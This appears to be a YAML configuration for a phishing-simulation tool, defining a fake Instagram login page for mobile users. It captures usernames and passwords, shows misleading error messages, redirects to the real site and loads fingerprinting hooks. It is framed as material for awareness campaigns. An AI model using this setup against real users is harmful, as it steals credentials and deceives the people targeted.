info:
  name: Instagram Login
  author: mh4x0f
  description: A phishing template that reproduces the Instagram login experience, optimized for mobile-first interactions. Designed to capture user credentials in social media-focused awareness campaigns.
  category: social
  system: true
  tags:
    - instagram
    - mobile
    - web
template_dir: instragram_login
steps:
  - id: login
    title: Instagram Login
    path: /login
    method: POST
    template_file: login.html
    success_message: Login information received. Proceeding to verification...
    redirect_url: https://www.instagram.com
    capture:
      enabled: true
      fields:
        - name: password
          required: true
          validate_regex: ^.{6,}$
          error_message: The password is incorrect. Please try again..
        - name: username
          required: true
          validate_regex: ^([A-Za-z0-9._-]{3,32}|[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}|^\+?[0-9]{8,15}$)$
          error_message: We couldn't find an account with that username. Try another
    simulate_delay_ms: 300
hooks:
  onLoad:
    - /hooks/fingerprint.js
    - /hooks/behavior.js
